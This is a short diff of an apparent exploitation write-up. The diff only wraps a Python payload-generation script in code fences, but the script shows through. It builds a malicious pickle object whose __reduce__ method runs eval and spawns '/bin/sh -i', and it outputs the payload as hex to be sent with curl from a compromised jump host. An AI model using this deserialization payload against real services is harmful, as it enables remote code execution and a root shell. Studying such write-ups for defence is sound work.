@@ -145,7 +145,7 @@ To bypass this, we crafted a "Trojan Horse" payload. We created a malicious clas
     Payload Generation Script:
 
 Python
-
+```
 import pickle
 import base64
 
@@ -171,7 +171,7 @@ subprocess.call(["/bin/sh","-i"])"""
         return (eval, (f"({background_cmd}, {{'user': 'root', 'revenue': '85000'}})[1]",))
 
 print(pickle.dumps(RCE()).hex())
-
+```
     Execution: We sent the generated hex string via a GET request using curl from our compromised jump-host container:
 
 Bash
